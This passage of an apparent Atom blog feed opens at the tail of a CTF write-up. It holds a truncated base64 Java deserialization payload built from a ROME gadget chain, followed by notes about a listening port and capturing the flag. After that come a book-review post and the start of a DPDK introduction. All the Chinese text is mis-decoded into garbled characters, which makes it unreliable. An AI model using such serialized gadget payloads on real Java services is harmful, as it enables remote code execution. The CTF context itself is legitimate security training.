0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpxAH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAUc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgACTAAKX2JlYW5DbGFzc3EAfgAcTAAEX2</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨å¯åŠ¨ç›‘å¬ç«¯å£</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/8.png" alt="8"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>è·å–flag</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;é¢˜ç›®åœ°å€&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åœ°å€&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åœ°å€&quot;&gt;&lt;/a&gt;é¢˜ç›®åœ°å€&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>è¯»ä¹¦åˆ†äº«I</title>
    <link href="elssm.github.io/2022/12/04/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABI/"/>
    <id>elssm.github.io/2022/12/04/è¯»ä¹¦åˆ†äº«I/</id>
    <published>2022-12-04T06:22:48.000Z</published>
    <updated>2022-12-14T06:01:36.945Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç ”ä¸‰ä¸Šå­¦æœŸæˆ‘çš„æ—¶é—´å‡ ä¹æ¯å¤©è¢«åˆ†æˆäº†å‡ å¤§å—ã€‚ç¡è§‰åƒé¥­ã€å¥èº«ã€è¯»ä¹¦ã€æ¯•è®¾ã€å‰ä»–ï¼Œç›®çš„æ˜¯è®©å­¦ç”Ÿæ—¶ä»£æœ€åè¿‡çš„æœ‰æ„ä¹‰äº›ã€‚å¥èº«æ—¶é—´æˆ‘åŸºæœ¬ä¸Šå›ºå®šåˆ°äº†æ¯å¤©ä¸­åˆçš„11:40åˆ°13:00ï¼Œä¸€å‘¨å¤§æ¦‚4å¤©æˆ–è€…5å¤©ã€‚è¯»ä¹¦æˆ‘ä¸€èˆ¬å›ºå®šåœ¨å‘¨å†…çš„ä¸­åˆå’Œæ™šä¸Šç¡è§‰å‰ï¼Œå‘¨æœ«æ—¶é—´å°±ä¸å›ºå®šäº†ã€‚ç›®å‰è¿™ç§çŠ¶æ€å¤§æ¦‚æŒç»­äº†3ä¸ªæœˆã€‚æ­£å¥½åšä¸€ä¸ªç®€å•çš„é˜…è¯»åˆ†äº«ã€‚</p><h4 id="ä¹¦ç±"><a href="#ä¹¦ç±" class="headerlink" title="ä¹¦ç±"></a>ä¹¦ç±</h4><ul><li>ç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ï¼ˆæˆ·æ ¹å‹¤ï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/1.png" alt="1" style="zoom:50%;"></p><p>èº«ä¸ºè®¡ç®—æœºä¸“ä¸šçš„å­¦ç”Ÿï¼Œç»å¸¸è¢«é—®åˆ°å¦‚ä¸‹ä¸€ä¸ªå…³äºç½‘ç»œçš„é—®é¢˜ã€‚</p><p>é¢è¯•å®˜ï¼šæˆ‘ç°åœ¨åœ¨æµè§ˆå™¨é‡Œè¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œè¯·ä½ ç®€è¿°ä¸€ä¸‹ä»å›è½¦ä¹‹ååˆ°å“åº”å‘ç”Ÿçš„å¤§æ¦‚æµç¨‹ã€‚</p><p>è¯¥ä¹¦å®Œç¾è§£ç­”äº†è¿™ä¸ªé—®é¢˜ï¼Œè¯»å®Œè¿™æœ¬ä¹¦ï¼Œæˆ‘ç›¸ä¿¡å¯¹äºé¢è¯•å®˜çš„è¿™ä¸ªé—®é¢˜è‡³å°‘å¯ä»¥å›ç­”40åˆ†é’Ÿã€‚ä¹¦ä¸­çš„é…å›¾ä¹Ÿå¾ˆè¯¦ç»†å¾ˆç›´è§‚ã€‚</p><ul><li>1984ï¼ˆä¹”æ²»å¥¥å¨å°”ï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/2.png" alt="2" style="zoom:50%;"></p><p><strong>æˆ˜äº‰å³å’Œå¹³ã€è‡ªç”±å³å¥´å½¹ã€æ— çŸ¥å³åŠ›é‡ã€‚</strong></p><p>ã€Š1984ã€‹æ˜¯ä¸€éƒ¨æ°å‡ºçš„æ”¿æ²»å¯“è¨€å°è¯´ï¼Œä¹Ÿæ˜¯ä¸€éƒ¨å¹»æƒ³å°è¯´ã€‚ä½œå“åˆ»ç”»äº†äººç±»åœ¨ææƒä¸»ä¹‰ç¤¾ä¼šçš„ç”Ÿå­˜çŠ¶æ€ï¼Œæœ‰è‹¥ä¸€ä¸ªæ°¸ä¸è¤ªè‰²çš„è­¦ç¤ºæ ‡ç­¾ï¼Œè­¦é†’ä¸–äººæé˜²è¿™ç§é¢„æƒ³ä¸­çš„é»‘æš—æˆä¸ºç°å®ã€‚å†ç»å‡ åå¹´ï¼Œå…¶ç”Ÿå‘½åŠ›ç›Šæ˜¾å¼ºå¤§ï¼Œè¢«èª‰ä¸º20ä¸–çºªå½±å“æœ€ä¸ºæ·±è¿œçš„æ–‡å­¦ç»å…¸ä¹‹ä¸€ã€‚</p><p>å¦‚æœç”Ÿæ´»åƒ1984è¿™æ ·ï¼Œé‚£äººç”Ÿè¿˜æœ‰ä»€ä¹ˆæ„ä¹‰ã€‚æ¸©æ–¯é¡¿è¿™æ ·çš„äººç‰©ï¼Œæœ€ç»ˆéƒ½è¢«å¼ºåˆ¶â€œé©¯åŒ–â€äº†ã€‚è¿™æœ¬ä¹¦è¯»åˆ°ä¸€åŠçš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºå¥¥ä¼¯è‰¯æ˜¯ä¸ªå¥½äººï¼Œæ²¡æƒ³åˆ°å¤ªåäº†ã€‚æˆ‘æœ‰ç†ç”±ç›¸ä¿¡å¥¥ä¼¯è‰¯æˆ–è®¸ä¹‹å‰ä¹Ÿæ˜¯å’Œæ¸©æ–¯é¡¿ä¸€æ ·çš„æƒ³æ³•ï¼Œåªä¸è¿‡å¥¥ä¼¯è‰¯å—åˆ°çš„â€œæ´—è„‘â€æ›´ä¸¥é‡ï¼Œä»è€Œå¯¼è‡´ä»–å®Œæˆäº†ä»ç—›æ¨è€å¤§å“¥åˆ°å´‡æ‹œè€å¤§å“¥çš„è½¬å˜ã€‚çœŸæ˜¯ç»†æ€ææï¼</p><ul><li>å±€å¤–äººï¼ˆåŠ ç¼ªï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/3.png" alt="3" style="zoom:50%;"></p><p><strong>äººç”Ÿåœ¨ä¸–ï¼Œæ°¸è¿œä¹Ÿä¸è¯¥æ¼”æˆä½œå‡ã€‚</strong></p><p>ã€Šå±€å¤–äººã€‹æ˜¯æ³•å›½ä½œå®¶åŠ ç¼ªçš„æˆåä½œï¼ŒåŒæ—¶ä¹Ÿæ˜¯å­˜åœ¨ä¸»ä¹‰æ–‡å­¦çš„æ°å‡ºä½œå“ä¹‹ä¸€ï¼Œè¯¥ä¹¦ä»¥ä¸€ç§å®¢è§‚è®°å½•å¼çš„â€œé›¶åº¦é£æ ¼â€ï¼Œç²—çº¿æ¡åœ°æè¿°äº†ä¸»äººå…¬é»˜å°”ç´¢åœ¨è’è°¬çš„ä¸–ç•Œä¸­ç»å†çš„ç§ç§è’è°¬çš„äº‹ï¼Œä»¥åŠè‡ªèº«çš„è’è¯ä½“éªŒã€‚ä»å‚åŠ æ¯äº²çš„è‘¬ç¤¼åˆ°å¶ç„¶æˆäº†æ€äººçŠ¯ï¼Œå†åˆ°è¢«åˆ¤å¤„æ­»åˆ‘ï¼Œé»˜å°”ç´¢ä¼¼ä¹å¯¹ä¸€åˆ‡éƒ½æ— åŠ¨äºè¡·ï¼Œä»–åƒä¸€ä¸ªè±¡å¾æ€§çš„ç¬¦å·ï¼Œä»£è¡¨äº†ä¸€ç§æ™®éçš„å­˜åœ¨ï¼Œåˆåƒæ˜¯ä¸€ä¸ªè¡€çº¢è‰²çš„ç¯å¡”ï¼Œå…·æœ‰é«˜åº¦çš„è­¦ç¤ºæ€§ã€‚ç„¶è€Œï¼Œå±€å¤–äººç°è±¡çš„äº§ç”Ÿæ— ç–‘æ˜¯ç”±è¿™ä¸ªä¸–ç•Œæœ¬èº«æ‰€å­•è‚²çš„ï¼Œé»˜å°”ç´¢çš„å­˜åœ¨æœ‰å…¶æ·±åˆ»çš„å¤–éƒ¨åŸå› ã€‚</p><p>çœ‹å®Œå±€å¤–äººåï¼Œæˆ‘å¾ˆæ¬£èµé»˜å°”ç´¢è¿™ä¸ªäººç‰©ï¼Œç‰¹ç«‹ç‹¬è¡Œï¼Œä¸æ‚²ä¸å–œã€‚ç„¶è€Œå°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªæ€§æ ¼ï¼Œæœ€åç«Ÿç„¶æˆä¸ºäº†åœ¨æ³•åº­ä¸Šè¢«å®¡åˆ¤çš„ç‚¹ï¼Œæˆ‘ç›¸ä¿¡ä¸–ç•Œä¸Šåƒé»˜å°”ç´¢è¿™æ ·çš„äººå¯¥å¯¥æ— å‡ ã€‚å¯¹äºä»–çš„é­é‡æˆ‘ä¹Ÿæ„Ÿåˆ°æƒ‹æƒœã€‚</p><ul><li>åˆ€é”‹ï¼ˆæ¯›å§†ï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/4.png" alt="4" style="zoom:50%;"></p><p><strong>å‰ƒåˆ€è¾¹ç¼˜æ— æ¯”é”‹åˆ©ï¼Œæ¬²é€šè¿‡è€…æ— ä¸è‰°è¾›ã€‚æ˜¯æ•…æ™ºè€…å¸¸è¨€ï¼Œæ•‘èµä¹‹é“éš¾è¡Œã€‚</strong></p><p>ã€Šåˆ€é”‹ã€‹å†™ä¸€ä¸ªå‚åŠ ç¬¬ä¸€æ¬¡ä¸–ç•Œå¤§æˆ˜çš„ç¾å›½é’å¹´é£è¡Œå‘˜æ‹‰é‡ŒÂ·è¾¾é›·å°”ã€‚åœ¨å†›é˜Ÿé‡Œï¼Œæ‹‰é‡Œç»“è¯†äº†ä¸€ä¸ªçˆ±å°”å…°å¥½å‹ï¼šè¿™äººå¹³æ—¶æ˜¯é‚£æ ·ä¸€ä¸ªç”Ÿé¾™æ´»è™èˆ¬çš„ç½®ç”Ÿæ­»äºåº¦å¤–çš„é£è¡Œå‘˜ï¼Œä½†åœ¨ä¸€æ¬¡é­é‡æˆ˜ä¸­ï¼Œå› å»æ•‘æ‹‰é‡Œè€Œä¸­å¼¹ç‰ºç‰²ã€‚æ‹‰é‡Œå› æ­¤å¯¹äººç”Ÿæ„Ÿåˆ°è¿·æƒ˜ï¼Œå¼„ä¸æ‡‚ä¸–ç•Œä¸Šä¸ºä»€ä¹ˆæœ‰æ¶å’Œä¸å¹¸ï¼Œæ‹‰é‡Œå¼€å§‹äº†ä»–ä»¤äººåŒªå¤·æ‰€æ€çš„è½¬å˜ã€‚</p><p>è¿™æœ¬ä¹¦ä¸­çš„äººç‰©åˆ»ç”»éå¸¸é²œæ˜ï¼Œä¾‹å¦‚è‰¾ç•¥ç‰¹èˆ…èˆ…ã€ä¼Šèè´å°”ã€å¸ƒé›·å¾·åˆ©å¤ªå¤ªã€æ‹‰é‡Œã€æ ¼é›·ã€è‹è²ã€è‹çŠç­‰ã€‚å…¶å®é™¤äº†ä¸»äººå…¬æ‹‰é‡Œæ„å¤–ï¼Œå…¶ä»–äººç‰©éƒ½å†™çš„å¾ˆå¥½ã€‚è‰¾ç•¥ç‰¹ï¼Œä¸€è¾ˆå­å–œæ¬¢äº¤é™…ã€å–œæ¬¢äººæƒ…ä¸–æ•…ã€‚ä½†æ˜¯æœ‰ä¸€é¢—å–„è‰¯çš„å¿ƒã€‚åˆšå¼€å§‹çœ‹çš„æ—¶å€™æˆ‘è§‰å¾—è¿™æ ·çš„äººæ´»ç€å±å®æœ‰äº›ç´¯ï¼Œä½†æ˜¯çœ‹åˆ°æœ€åï¼Œæˆ‘é€æ¸ç†è§£äº†è‰¾ç•¥ç‰¹ã€‚ä¼Šèè´å°”ï¼Œæ›¾ç»æ˜¯æ‹‰é‡Œçš„æœªå©šå¦»ï¼Œè¯´å®è¯ä¹¦çš„å‰é¢æˆ‘å¾ˆæ¬£èµä¼Šèè´å°”ï¼Œæ„Ÿè§‰è¿™ç§å¥³çš„çœŸæ˜¯ä¸å¯å¤šå¾—ã€‚ä¸€èˆ¬äººéƒ½ä¸èƒ½ç†è§£æ‹‰é‡Œï¼Œä½†æ˜¯å¥¹å´èƒ½å¤Ÿä¸€ç›´é™ªä¼´æ‹‰é‡Œã€‚å¥½å®¶ä¼™æ²¡æƒ³åˆ°åé¢åè½¬äº†ï¼Œé™·å®³è‹è²(å½“ç„¶è‹è²ä¹Ÿæœ‰è‡ªèº«åŸå› )ï¼Œä¹‹åæˆ‘å°±ä¸å–œæ¬¢è¿™ä¸ªäººç‰©äº†ã€‚è‹çŠï¼Œæˆ‘è§‰å¾—æ´»çš„å¾ˆçœŸå®ï¼Œä¹Ÿå¾ˆæ¸…æ¥šè‡ªå·±æƒ³è¦ä»€ä¹ˆï¼Œå½“ç„¶è‹çŠçš„æ—¥å­æœ€åä¹Ÿè¿‡çš„å¾ˆèˆ’æœã€‚éšé‡è€Œå®‰å°±æ˜¯æœ€å¥½çš„ï¼</p><ul><li>äººç”Ÿï¼ˆè·¯é¥ï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/5.png" alt="5" style="zoom:50%;"></p><p><strong>äººç”Ÿçš„é“è·¯è™½ç„¶æ¼«é•¿ï¼Œä½†ç´§è¦å¤„å¸¸å¸¸åªæœ‰å‡ æ­¥ï¼Œç‰¹åˆ«æ˜¯å½“äººå¹´è½»çš„æ—¶å€™ã€‚</strong></p><p>ã€Šäººç”Ÿã€‹æ˜¯è·¯é¥çš„ä¸€éƒ¨ä¸­ç¯‡å°è¯´ï¼Œå‘è¡¨äº1982å¹´ï¼Œå®ƒä»¥æ”¹é©æ—¶æœŸé™•åŒ—é«˜åŸçš„åŸä¹¡ç”Ÿæ´»ä¸ºæ—¶ç©ºèƒŒæ™¯ï¼Œå™è¿°äº†é«˜ä¸­æ¯•ä¸šç”Ÿé«˜åŠ æ—å›åˆ°åœŸåœ°åˆç¦»å¼€åœŸåœ°ï¼Œå†å›åˆ°åœŸåœ°è¿™æ ·äººç”Ÿçš„å˜åŒ–è¿‡ç¨‹ã€‚é«˜åŠ æ—åŒå†œæ‘å§‘å¨˜åˆ˜å·§çã€åŸå¸‚å§‘å¨˜é»„äºšèä¹‹é—´çš„æ„Ÿæƒ…çº è‘›æ„æˆäº†æ•…äº‹å‘å±•çš„çŸ›ç›¾ï¼Œä¹Ÿæ­£æ˜¯ä½“ç°é‚£ç§è‰°éš¾é€‰æ‹©çš„æ‚²å‰§ã€‚</p><p>å¯¹äºé«˜åŠ æ—çš„é­é‡æˆ‘å¾ˆå…±æƒ…ï¼Œå½“ä¸€å®¶ä¸‰å£å¾—çŸ¥é«˜åŠ æ—æ•™å¸ˆèŒä½è¢«æ’¤å»ä¹‹åï¼Œæˆ‘æƒ³åˆ°äº†è‡ªå·±å½“æ—¶å¾—çŸ¥è‡ªå·±è€ƒç ”å¤è¯•è¢«åˆ·åçš„æƒ…å½¢ã€‚åƒä¸ä¸‹å»é¥­ï¼Œçœ‹ä¸è¿›å»ä¹¦ï¼Œå¬ä¸è¿›å»è¯ã€‚æµ‘æµ‘å™©å™©è¿‡äº†ä¸¤å‘¨ï¼Œå½“æ—¶éƒ½æƒ³è¿‡äºŒæˆ˜ï¼Œä½†æ˜¯åˆæ²¡æœ‰è¶³å¤Ÿçš„å‹‡æ°”ä¸æ¯…åŠ›ï¼Œæœ€ç»ˆè¿˜æ˜¯é€‰æ‹©äº†è°ƒå‰‚ã€‚å¯¹äºé«˜åŠ æ—çš„æ„å¿—æˆ‘æ„Ÿåˆ°ä½©æœï¼Œåœ¨å†œæ‘é‚£æ ·çš„ç¯å¢ƒä¸‹ï¼Œèƒ½å¤Ÿä¸€ç›´åšæŒï¼Œæ²¡æœ‰é¢“åºŸä¸‹å»ã€‚</p><p>ä½†æ˜¯æˆ‘è§‰å¾—é«˜åŠ æ—çš„æ¬²æœ›å¤ªå¤§äº†ã€‚å·§çå¤šå¥½çš„å§‘å¨˜ï¼Œç°åœ¨æ‰“ç¯ç¬¼éƒ½æ‰¾ä¸ç€ï¼ä½ é«˜åŠ æ—å¤±è½çš„æ—¶å€™æ˜¯è°åœ¨é™ªä½ ï¼Œä½ é«˜åŠ æ—é”„åœ°å—ä¼¤çš„æ—¶å€™æ˜¯è°ç»™ä½ æŠ¹çš„è¯ï¼Œä½ é«˜åŠ æ—é¦’å¤´å–ä¸å‡ºå»çš„æ—¶å€™æ˜¯è°å¸®çš„ä½ ã€‚ä½ é«˜åŠ æ—å€’å¥½ï¼Œä¸ºäº†è‡ªå·±çš„æœªæ¥ç›´æ¥æŠ›å¼ƒå·§çè¦å’Œé»„äºšèåœ¨ä¸€èµ·ã€‚å¤ªå¹´è½»äº†ï¼Œtoo young too simpleï¼äºšèä¹Ÿæ˜¯æ€¥ï¼Œè¢«çˆ±æƒ…å†²æ˜äº†å¤´è„‘ï¼Œæˆ‘çœ‹äººå¼ å…‹å—å°±ä¸é”™å˜›ã€‚</p><ul><li>æˆ‘çš„é˜¿å‹’æ³°ï¼ˆæå¨Ÿï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>æœ€å®‰é™ä¸æœ€å­¤ç‹¬çš„æˆé•¿ï¼Œä¹Ÿæ˜¯èƒ½ä½¿äººè¸å®ã€è‡ªä¿¡ã€å¼ºå¤§ã€å–„è‰¯çš„ã€‚å¤§ä¸äº†ï¼ŒååèˆŒå¤´è€Œå·²ã€‚</strong></p><p>æå¨Ÿçš„æ•£æ–‡æˆåä½œå’Œä»£è¡¨ä½œä¹‹ä¸€ã€‚åŸç”Ÿæ€è®°å½•äº†ä½œè€…åœ¨ç–†åŒ—é˜¿å‹’æ³°åœ°åŒºç”Ÿæ´»çš„ç‚¹ç‚¹æ»´æ»´ï¼ŒåŒ…æ‹¬äººä¸äº‹çš„è®°å¿†å’Œæ„Ÿæ‚Ÿã€‚å…¨ä¹¦æ–‡å­—æ˜å‡€ï¼Œè´¨åœ°çº¯ç²¹ï¼ŒåŸç”Ÿæ€åœ°å†ç°äº†ç–†åŒ—é£ç‰©äººæƒ…ï¼Œå……æ»¡äº†æœ´é‡æ¸…æ–°çš„æ°”æ¯ã€‚åå¹´å‰ï¼Œä½œè€…åœ¨åˆ°å¤„æ”¶é›†æ¥çš„çº¸ç‰‡ä¸Šç”¨å¯†å¯†éº»éº»çš„æ–‡å­—å†™ä¸‹å¥¹çš„ç”Ÿæ´»å’Œæ„Ÿæ‚Ÿï¼ŒæŠ•ç¨¿åˆ°æ–°ç–†çš„æ–‡è‰ºæœŸåˆŠã€‚ä¸€äº›èµ„æ·±çš„ç¼–è¾‘è®¤ä¸ºä¸€ä¸ªäºŒåå²å·¦å³çš„å¥³å­©ä¸å¯èƒ½å†™å‡ºå¦‚æ­¤æ¸…æ–°è€Œæœ‰æ‰åçš„ä½œå“ã€‚ä½†æ–°ç–†è‘—åä½œå®¶åˆ˜äº®ç¨‹å°†å¥¹æŒ–æ˜å‡ºæ¥ï¼Œå¥¹çš„*éƒ¨ä½œå“ä»¥ã€Šä¹ç¯‡é›ªã€‹ä¸ºåç»“é›†å‡ºç‰ˆï¼Œäººä»¬æ‰å¼€å§‹çŸ¥é“æœ‰ä¸ªæ–°ç–†å¥³å­©å«æå¨Ÿã€‚æ­¤åï¼Œå¥¹çš„æ•£æ–‡åœ¨ã€Šå—æ–¹å‘¨æœ«ã€‹ã€ã€Šæ–‡æ±‡æŠ¥ã€‹é™†ç»­åˆŠç™»ï¼Œå®Œå…¨æ˜¯å¤©æ‰çš„ç¬”è§¦ï¼Œå¼•èµ·äº†æ–‡å›çš„éœ‡æƒŠã€‚äººä»¬å¾ˆéš¾æƒ³è±¡ï¼šä¸€ä¸ªæ²¡æœ‰å—è¿‡å®Œæ•´é«˜ç­‰æ•™è‚²ã€é˜…è¯»èŒƒå›´ä¸»è¦é™äºé‡‘åº¸ã€ç¼ç‘¶ã€ä¸€ç›´ç”Ÿæ´»åœ¨ç–†åŒ—è’é‡ä¹‹åœ°çš„å¥³å­©ï¼Œèƒ½å¤Ÿå†™å‡ºå¦‚æ­¤æ¸…æ–°ã€æ´»æ³¼ã€å……æ»¡çµæ€§å’Œç”Ÿå‘½åŠ›çš„æ–‡å­—ã€‚</p><p>ä¹¦ä¸­è®²è¿°äº†ä¸€ä¸ªä¸€ä¸ªçš„å°æ•…äº‹ï¼Œå¾ˆå–„è‰¯å¾ˆæ¸©é¦¨ã€‚çœ‹å®Œä¹‹åæˆ‘å‘ç°æå¨Ÿçš„ç«¥å¹´å¾ˆå……å®ï¼Œå–è´§è¸©ç¼çº«æœºæ‘˜è˜‘è‡å“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå¸Œæœ›åé¢æœ‰æœºä¼šä¹Ÿèƒ½å»æ–°ç–†ç©ä¸€ç©ï¼</p><ul><li>æˆ‘ä¸åœ°å›ï¼ˆå²é“ç”Ÿï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>åªè¦è¿˜èƒ½å“­å°±è¿˜æœ‰æ•‘ï¼Œåªè¦è¿˜èƒ½å“­å°±æœ‰å“­å¤Ÿçš„æ—¶å€™ã€‚</strong></p><p>ã€Šæˆ‘ä¸åœ°å›ã€‹ç”±ä¸­å›½å½“ä»£è‘—åä½œå®¶å²é“ç”Ÿè‘—ã€‚æ˜¯å²é“ç”Ÿæ–‡å­¦ä½œå“ä¸­ï¼Œå……æ»¡å“²æ€åˆæä¸ºäººæ€§åŒ–çš„ä»£è¡¨ä½œä¹‹ä¸€ã€‚å…¶å‰ç¬¬ä¸€æ®µå’Œç¬¬äºŒæ®µè¢«çº³å…¥äººæ°‘æ•™è‚²å‡ºç‰ˆç¤¾çš„é«˜ä¸€æ•™æä¸­ã€‚å‰ä¸¤éƒ¨åˆ†æ³¨é‡è®²åœ°å›å’Œä»–ä¸æ¯äº²çš„åæ‚”ï¼Œå¯¹äºä¸­å­¦ç”Ÿæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç¯‡ä»¤äººåæ€çš„ä¼˜ç§€æ–‡ç« ã€‚</p><p>å²é“ç”Ÿçš„æ–‡ç¬”çœŸæ˜¯å¤ªç»†è…»äº†ï½ï½ï½</p><ul><li>éƒ½æŸæ—äººï¼ˆè©¹å§†æ–¯ä¹”ä¼Šæ–¯ï¼‰</li></ul><p><img src="/2022/12/04/è¯»ä¹¦åˆ†äº«I/8.png" alt="8" style="zoom:50%;"></p><p>ã€Šéƒ½æŸæ—äººã€‹æ˜¯è©¹å§†æ–¯Â·ä¹”ä¼Šæ–¯ä¹…è´Ÿç››åçš„çŸ­ç¯‡å°è¯´é›†ï¼Œç§°å¾—ä¸Š20ä¸–çºªæ•´ä¸ªè¥¿æ–¹æœ€è‘—åçš„çŸ­ç¯‡å°è¯´é›†äº†ã€‚1914å¹´å‡ºç‰ˆï¼Œç½®æ™¯äºäºŒä¸‰åå¹´ä»£çš„éƒ½æŸæ—ï¼Œæˆªå–ä¸­ä¸‹å±‚äººæ°‘ç”Ÿæ´»çš„æ¨ªæ–­é¢ï¼Œä¸€ä¸ªç‰‡åˆ»ä¸€ç¾¤äººï¼Œåäº”ä¸ªæ•…äº‹æ±‡é›†èµ·æ¥ï¼Œå®›è‹¥ä¸€å¹…å°è±¡ä¸»ä¹‰çš„ç»˜ç”»ï¼Œç¬”è§¦ç®€ç»ƒï¼Œé”™è½æˆç¯‡ï¼Œæµ®ç°å‡ºè‹å‡‰ä¸–æ€ï¼Œé¥è¿œã€æ¸…å†·ï¼Œç„¶è€Œç²¾è‡´ï¼Œæ˜¯ä¸Šä¸Šä¹‹å“ã€‚</p><p>æ•…äº‹çš„æ„æˆå¾ˆç²¾å¿ƒï¼Œåº”è¯¥éƒ½æ˜¯äº›å¼€æ”¾å¼çš„ç»“å°¾å§ï¼Œå°è±¡æ¯”è¾ƒæ·±åˆ»çš„æ•…äº‹æ˜¯æ¯äº²ã€ä¸¤ä¸ªæµªæ±‰å’Œå…¬å¯“ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;ç ”ä¸‰ä¸Šå­¦æœŸæˆ‘çš„æ—¶é—´å‡ ä¹æ¯å¤©è¢«åˆ†æˆäº†å‡ å¤§å—ã€‚ç¡è§‰åƒé¥­ã€å¥èº«ã€è¯»ä¹¦ã€æ¯•è®¾ã€å‰ä»–ï¼Œç›®çš„æ˜¯è®©å­¦ç”Ÿæ—¶ä»£æœ€åè¿‡çš„æœ‰æ„ä¹‰äº›ã€‚å¥èº«æ—¶é—´æˆ‘åŸºæœ¬ä¸Šå›ºå®šåˆ°äº†æ¯å¤©ä¸­
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>DPDKåˆæ¢</title>
    <link href="elssm.github.io/2022/10/10/DPDK%E5%88%9D%E6%8E%A2/"/>
    <id>elssm.github.io/2022/10/10/DPDKåˆæ¢/</id>
    <published>2022-10-10T02:36:17.000Z</published>
    <updated>2022-10-10T02:58:22.796Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä»€ä¹ˆæ˜¯DPDKï¼Ÿå¯¹äºç”¨æˆ·ï¼Œæ˜¯æ€§èƒ½å‡ºè‰²çš„æŠ¥æ•°æ®å¤„ç†åŠ é€Ÿè½¯ä»¶åº“ï¼›å¯¹äºå¼€å‘è€…ï¼Œæ˜¯ä¸€ä¸ªå®è·µåŒ…å¤„ç†æ–°æƒ³æ³•çš„åˆ›æ–°å·¥åœºï¼›å¯¹äºæ€§èƒ½è°ƒä¼˜è€…ï¼Œæ˜¯ä¸€ä¸ªç»ä½³çš„æˆæœåˆ†äº«å¹³å°ã€‚DPDKå¯¹äºå½“ä¸‹ç«çƒ­çš„ç½‘ç»œåŠŸèƒ½è™šæ‹ŸåŒ–è€Œè¨€æ˜¯ä¸€ä¸ªé‡è¦åŸºçŸ³ã€‚</p><p>DPDKæœ€åˆçš„åŠ¨æœºå¾ˆç®€å•ï¼Œå°±æ˜¯è¯æ˜IAå¤šæ ¸å¤„ç†å™¨èƒ½å¤Ÿæ”¯æ’‘é«˜æ€§èƒ½æ•°æ®åŒ…å¤„ç†ã€‚éšç€æ—©æœŸç›®æ ‡çš„è¾¾æˆå’Œæ›´å¤šé€šç”¨å¤„ç†å™¨ä½“ç³»çš„åŠ å…¥ï¼ŒDPDKé€æ¸æˆä¸ºé€šç”¨å¤šæ ¸å¤„ç†å™¨é«˜æ€§èƒ½æ•°æ®åŒ…å¤„ç†çš„ä¸šç•Œæ ‡æ†ã€‚</p><h4 id="ä¸»æµåŒ…å¤„ç†ç¡¬ä»¶å¹³å°"><a href="#ä¸»æµåŒ…å¤„ç†ç¡¬ä»¶å¹³å°" class="headerlink" title="ä¸»æµåŒ…å¤„ç†ç¡¬ä»¶å¹³å°"></a>ä¸»æµåŒ…å¤„ç†ç¡¬ä»¶å¹³å°</h4><p>æ”¯æŒåŒ…å¤„ç†çš„ä¸»æµç¡¬ä»¶å¹³å°å¤§è‡´åˆ†ä¸ºä¸‰ä¸ªæ–¹å‘ã€‚</p><ul><li>ç¡¬ä»¶åŠ é€Ÿå™¨ï¼šå¯¹äºæœ¬èº«æ¨¡å—åŒ–çš„å›ºåŒ–åŠŸèƒ½å…·æœ‰é«˜æ€§èƒ½ä½æˆæœ¬çš„ç‰¹ç‚¹</li><li>ç½‘ç»œå¤„ç†å™¨ï¼šæä¾›äº†åŒ…å¤„ç†é€»è¾‘è½¯ä»¶å¯ç¼–ç¨‹çš„èƒ½åŠ›</li><li>å¤šæ 